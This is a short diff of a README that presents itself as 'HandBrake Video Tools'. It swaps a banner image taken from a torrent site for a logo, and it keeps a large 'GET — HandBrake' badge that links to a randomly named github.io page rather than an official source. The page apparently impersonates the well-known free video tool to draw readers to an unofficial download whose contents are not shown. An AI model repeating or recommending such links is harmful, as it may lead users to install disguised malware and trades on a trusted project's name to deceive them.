@@ -1,6 +1,6 @@
 # HandBrake Video Tools — Encoding, Transcoding & Media Processing
 
-![Banner Placeholder](https://torrents-soft.ru/uploads/posts/2025-12/rwwigjrm2kg2dn-5dzoeyrxd-ztfg1cblkmpfaw4b70unr3hx8kqsnabi0m-axkzk4inmf6q3pt6l5y3ncc8xnk8ntgl5htkcp6yvz1xnynlapwatajdtxtjqcfw4hogsarjo8fedq.png)
+![Banner Placeholder](https://www.talkhelper.com/wp-content/uploads/2020/11/handbrake-logo.jpg)
 
 [![GET — HandBrake](https://img.shields.io/badge/GET%20%E2%80%94%20HandBrake-0078D6?style=for-the-badge&logoColor=white)](https://79t2alessiost0an6escu.github.io/.github/HandBrake-Video-Tools)
 
